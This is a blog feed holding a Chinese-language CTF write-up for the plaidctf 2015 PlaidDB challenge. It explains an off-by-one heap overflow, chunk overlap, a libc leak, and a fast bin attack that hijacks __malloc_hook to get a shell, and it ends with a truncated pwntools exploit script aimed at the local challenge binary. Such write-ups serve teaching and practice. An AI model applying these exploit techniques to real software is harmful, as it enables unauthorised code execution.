<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>坠入星野的月🌙</title>
  
  <subtitle>Welcome</subtitle>
  <link href="https://www.uf4te.cn/atom.xml" rel="self"/>
  
  <link href="https://www.uf4te.cn/"/>
  <updated>2024-06-06T13:43:14.000Z</updated>
  <id>https://www.uf4te.cn/</id>
  
  <author>
    <name>uf4te</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【plaidctf 2015】PlaidDB</title>
    <link href="https://www.uf4te.cn/posts/14f0dc5a.html"/>
    <id>https://www.uf4te.cn/posts/14f0dc5a.html</id>
    <published>2024-05-31T09:22:41.000Z</published>
    <updated>2024-06-06T13:43:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>利用 off-by-one 漏洞造成 Chunk Overlap，通过对堆的布局利用 <code>unsorted bin</code> 修改已有 <code>chunk</code> 内容为 <code>bk</code> 指针，泄露 libc 地址，并利用 fast bin attack，错位伪造 <code>chunk</code>，劫持 <code>__malloc_hook</code> 为 one_gadget 来 getshell</li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/2015_plaidctf_datastore">【plaidctf 2015】PlaidDB</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护，64 位保护全开：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb1.png" alt="【plaidctf 2015】plaiddb1.png"></p><p>尝试运行：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb2.png" alt="【plaidctf 2015】plaiddb2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb3.png" alt="【plaidctf 2015】plaiddb3.png"></p><p>程序最开始会初始化三个堆，经过后面的分析可以知道，第一个堆存放的是结构体，主要使用了二叉树的结构来存储数据：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">;</span>    <span class="token keyword">long</span> data_size<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>left<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">long</span> dummy1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>不过关于树的结构我没太看懂。。。网上说是红黑树？我只知道前三个指针，但是二叉树各节点之间的关系是怎么来的不太明白</p></blockquote><p>其初始化 <code>row_key</code> 为 <code>th3fl4g</code>，初始化 <code>data</code> 为 <code>youwish</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb11.png" alt="【plaidctf 2015】plaiddb11.png"></p><p>程序运行时 <code>PROMPT: Enter command:</code> 是在 <code>sub_1A20()</code> 函数中定义的，有 <code>GET</code>、<code>PUT</code>、<code>DUMP</code>、<code>DEL</code>、<code>EXIT</code> 这几种命令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb4.png" alt="【plaidctf 2015】plaiddb4.png"></p><p><code>GET</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb5.png" alt="【plaidctf 2015】plaiddb5.png"></p><p>首先通过 <code>sub_1040()</code> 函数读取 <code>row_key</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb6.png" alt="【plaidctf 2015】plaiddb6.png"></p><p>首先 <code>malloc(8)</code> 来存放 <code>row_key</code> ，如果空间大小不够，再 <code>realloc()</code></p><blockquote><p>仔细观察可以发现 <code>sub_1040()</code> 函数这个输入存在 off-by-null 漏洞，如果将数据写满，该函数会溢出 1 字节，并将其置为 NULL</p></blockquote><p><code>PUT</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb7.png" alt="【plaidctf 2015】plaiddb7.png"></p><p>主要是输入一些数据，首先 <code>malloc(0x38)</code> 申请了一个堆块用于存放结构体</p><p>同样使用了 <code>sub_1040()</code> 函数来读取 <code>row_key</code>，并申请了第二个堆块，指针存放在 <code>*v0</code></p><p>然后 <code>malloc(v1)</code> 申请了第三个堆块，读入 <code>size</code> 大小的数据 <code>data</code></p><p>通过调试来验证一下，执行 <code>PUT(1, 2, b&#39;a&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb9.png" alt="【plaidctf 2015】plaiddb9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb10.png" alt="【plaidctf 2015】plaiddb10.png"></p><p><code>DEL</code> 功能：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb16.png" alt="【plaidctf 2015】plaiddb16.png"></p><p>这个函数实现的是删除功能，由于是二叉树结构，这个函数比较复杂，只需要知道是按照 <code>row_key</code> 来进行删除的就行，<code>row_key</code> 通过 <code>sub_1040()</code> 函数读取，依然是存在 off-by-one 漏洞的</p><p>现在根据以上分析，结合程序运行，可以大致知道该程序的功能了：</p><ul><li><code>PUT</code> 插入数据，包括 <code>row_key</code>、<code>data_size</code>、<code>data</code>  </li><li><code>GET</code> 打印 <code>row_key</code> 对应的 <code>data</code>  </li><li><code>DUMP</code> 打印所有 <code>row_key</code>  </li><li><code>DEL</code> 删除 <code>row_key</code> 对应的数据</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb8.png" alt="【plaidctf 2015】plaiddb8.png"></p><p>虽然输入 <code>row_key</code> 时存在 off-by-one 漏洞，但特殊在于，其使用了 <code>realloc()</code> 使分配的大小通过可用空间大小乘二的方式增大</p><p>也就是说想要触发这个漏洞，对于分配的大小有要求，满足该要求的大小有：<code>0x18</code>、<code>0x38</code>、<code>0x78</code>、<code>0xf8</code>、<code>0x1f8</code> 等</p><blockquote><p>通过 off-by-one 漏洞溢出后，可以造成 Chunk Overlap，并泄露 libc 地址，且可以形成 UAF，对于 UAF 漏洞首选 fast bin attack 的方法</p></blockquote><p>我们首先需要有一个处于释放状态的 <code>unsorted bin chunk</code> 或者 <code>small bin chunk</code>，然后在其下方还需要一个进行溢出的 <code>chunk</code> 和被溢出的 <code>chunk</code></p><p>然后利用 off-by-one 漏洞，使它们全都被合并为一个处于释放状态的 <code>chunk</code>，这样中间任意 <code>chunk</code> 的位置如果是已被分配的，就可以造成 Chunk Overlap</p><p>大致结构如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free 的 unsorted bin 或是 small bin chunk （因为此时 fd 和 bk 指向合法指针，才能够进行 unlink）<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>     <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 任意 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>            <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 进行溢出的 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>    vuln    <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 被溢出的 chunk，大小为 <span class="token number">0</span>x_00 （例如 <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token number">0x200</span>……）<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合 <code>sub_1040()</code> 函数通过 <code>malloc(8)</code> 再 <code>realloc()</code> 的分配方式，对于堆的布局有以下要求：</p><ol><li>任意 <code>chunk</code> 位置至少有一个已经被分配、且可以读出数据的 <code>chunk</code> 来泄露 <code>libc</code> 地址  </li><li>任意 <code>chunk</code> 位置至少还需要有一个已经被释放、且 <code>size</code> 为 <code>0x71</code> 的 <code>chunk</code> 来进行 <code>fast bin attack</code>  </li><li>进行溢出的 <code>chunk</code> 需要在最上方的 <code>chunk</code> 之前被分配，否则 <code>malloc(8)</code> 的时候会分配到最上方，而不是进行溢出 <code>chunk</code> 所在的下方的位置  </li><li>进行溢出的 <code>chunk</code> 大小应该属于 <code>unsorted bin</code> 或是 <code>small bin</code>，不能为 <code>fast bin</code>，否则被释放之后，按照 <code>sub_1040()</code> 函数的分配方式，<code>malloc(8)</code> 无法分配在该位置  </li><li>最下方应该有一个已经被分配的 <code>chunk</code> 来防止与 <code>top chunk</code> 合并</li></ol><p>按照上述要求，完整的堆结构应该如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">1</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> free 的 size <span class="token operator">==</span> <span class="token number">0x200</span> chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">2</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x60</span> fastbin chunk，已被分配，且可以读出数据<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">3</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x71</span> fastbin chunk，为 fastbin attack 做准备<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">4</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x1f8</span> free 状态的 small bin<span class="token operator">/</span>unsorted bin chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>      chunk <span class="token number">5</span>     <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> size <span class="token operator">==</span> <span class="token number">0x101</span> 被溢出 chunk<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>         X        <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span> 任意分配后 chunk 防止 top chunk 合并<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于分配过程中还存在一些额外结构，包括结构体本身的分配和 <code>sub_1040()</code> 函数，因此需要先释放出足够的 <code>fast bin chunk</code> 来避免结构体本身的分配对我们布置的对结构造成影响</p><p>这里通过先执行 10 次 <code>PUT()</code> 和 10 次 <code>DEL()</code> 来实现：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb12.png" alt="【plaidctf 2015】plaiddb12.png"></p><p>构造好我们需要的堆块后，分别 <code>free</code> 掉 <code>chunk 3</code>、<code>chunk 4</code> 和 <code>chunk 1</code></p><p><code>DEL(b&#39;3&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb13.png" alt="【plaidctf 2015】plaiddb13.png"></p><p><code>DEL(b&#39;4&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb14.png" alt="【plaidctf 2015】plaiddb14.png"></p><p><code>DEL(b&#39;1&#39;)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb15.png" alt="【plaidctf 2015】plaiddb15.png"></p><p>这样就形成了我们所需要的堆结构</p><p>然后利用 <code>DEL()</code> 中 <code>sub_1040()</code> 函数读取 <code>row_key</code> 时的 off-by-one 漏洞，将 <code>chunk 4</code> 写满，并溢出覆盖 <code>chunk 5</code> 的 <code>prev_size</code> 域：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb18.png" alt="【plaidctf 2015】plaiddb18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb17.png" alt="【plaidctf 2015】plaiddb17.png"></p><p>这里覆盖的是 <code>0x4e0</code>，因为我们为了造成 Chunk Overlap，需要让这些 <code>chunk</code> 全部被合并为一个处于释放状态的 <code>chunk</code></p><p>因此 <code>chunk 5</code> 的 <code>prev_size</code> 域需要修改为前几个 <code>chunk</code> 的大小之和，即：<code>0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30</code></p><p>然后 <code>free</code> 掉 <code>chunk 5</code>，这些 <code>chunk</code> 将会被合并成一个 <code>unsorted bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb19.png" alt="【plaidctf 2015】plaiddb19.png"></p><p>由于此时还存在一个 <code>0x360</code> 的 <code>small bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb20.png" alt="【plaidctf 2015】plaiddb20.png"></p><p>为了防止干扰，需要先通过 <code>PUT(b&#39;0x200&#39;, 0x200, b&#39;fillup&#39;)</code> 将其分配掉：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb21.png" alt="【plaidctf 2015】plaiddb21.png"></p><p>此时合并的 <code>chunk</code> 被置于 <code>large bin</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb22.png" alt="【plaidctf 2015】plaiddb22.png"></p><blockquote><p>为了泄露 libc 基地址，我们可以利用 <code>unsorted bin</code> 的特性，打印其 <code>bk</code> 指针</p><p>首先，我们需要利用此时 <code>chunk 2</code> 与合并的 <code>chunk</code> 重叠的特点，利用 <code>unsorted bin</code> 来修改 <code>chunk 2</code> 的指针</p></blockquote><p>因此，我们先通过 <code>PUT(b&#39;0x200 fillup&#39;, 0x200, b&#39;fillup again&#39;)</code> 从 <code>large bin</code> 中将之前的 <code>chunk 1</code> 的空间分配掉：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb23.png" alt="【plaidctf 2015】plaiddb23.png"></p><p>此时 <code>chunk 2</code> 处于 <code>unsorted bin</code> 的第一个位置，其指针已被 <code>unsorted bin</code> 修改</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb24.png" alt="【plaidctf 2015】plaiddb24.png"></p><p>于是我们只需 <code>GET(b&#39;2&#39;)</code> 就可以在 <code>data_size</code> 输出的位置输出 <code>bk</code> 指针：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb25.png" alt="【plaidctf 2015】plaiddb25.png"></p><p><code>bk</code> 指针指向 <code>main_arena + 88</code> 的位置，根据 <code>main_arena</code> 与 <code>__malloc_hook</code> 存在固定偏移 <code>0x10</code>，利用 <code>__malloc_hook</code> 在 libc 中的偏移即可得到 libc 基地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb26.png" alt="【plaidctf 2015】plaiddb26.png"></p><p>由于前面我们已经释放了 <code>chunk 1</code>、<code>chunk 3</code>、<code>chunk 4</code>，只剩 <code>chunk 2</code> 和 <code>chunk 5</code> 可以利用了，此时 <code>unsorted bin</code> 距离 <code>chunk 5</code> 正好 <code>0x5586e425b950 - 0x5586e425b900 = 0x50</code></p><p>于是填充 <code>0x58</code> 就可以修改 <code>chunk 5</code> 的 <code>size</code> 域和 <code>fd</code>，即可控制下一个 <code>fast bin</code> 的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb27.png" alt="【plaidctf 2015】plaiddb27.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb28.png" alt="【plaidctf 2015】plaiddb28.png"></p><p>然后进行 fast bin attack：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb29.png" alt="【plaidctf 2015】plaiddb29.png"></p><p>劫持 <code>__malloc_hook</code> 为 one_gadget：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb30.png" alt="【plaidctf 2015】plaiddb30.png"></p><p>这样看得更清楚：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb31.png" alt="【plaidctf 2015】plaiddb31.png"></p><p>最后执行一次 <code>DEL()</code></p><p>利用 <code>sub_1040()</code> 函数中的 <code>malloc(8)</code> 触发 one_gadget 即可获得 shell</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment"># ubuntu 16.04 Glibc 2.23</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./datastore'</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">PUT</span><span class="token punctuation">(</span>row_key<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">b'PUT'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;</span> size<span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'data:\n'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEL</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'DEL'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">GET</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' bytes'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b' bytes'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment"># 相关函数实现的时候用到了一些 0x38 大小的块，避免影响我们提前搞一些</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PUT<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    DEL<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>   <span class="token comment"># 设置的大一些，后面分配的时候会优先将其分配出去，但分配的过大就不会物理相连了，实测绕不开后面的问题</span>PUT<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来都 libc 的已分配块，表面上未分配，大小符合 fast bin 即可，暂未验证</span>PUT<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来进行 fast bin attack 的块，大小应该符合 fast bin 即可，暂未验证</span>PUT<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">,</span> <span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>   <span class="token comment"># 用来溢出的块，溢出到下一个块的 pre_size 把他修改成上面全部块大小的和</span>PUT<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>    <span class="token comment"># 用来被溢出的块</span>PUT<span class="token punctuation">(</span><span class="token string">b'defense'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">b'defense-top chunk'</span><span class="token punctuation">)</span>   <span class="token comment"># 用来防止被 top chunk 合并</span>DEL<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 溢出，0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30 (这是没有被使用的指针部分大小，三个)</span>DEL<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>   <span class="token comment"># 合并 1 2 5 3 4 块</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup'</span><span class="token punctuation">)</span>   <span class="token comment"># 这里是在 defense 块分配后导致清理碎片清理，多出来一个 0x360 的 small bin 要先把他分配掉</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200 fillup'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup again'</span><span class="token punctuation">)</span>   <span class="token comment"># 把 1 分配掉，这样 2 就是第一个块了，可以打印相关地址，泄漏 libc 基地址</span>libc_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>GET<span class="token punctuation">(</span><span class="token string">'2'</span><span 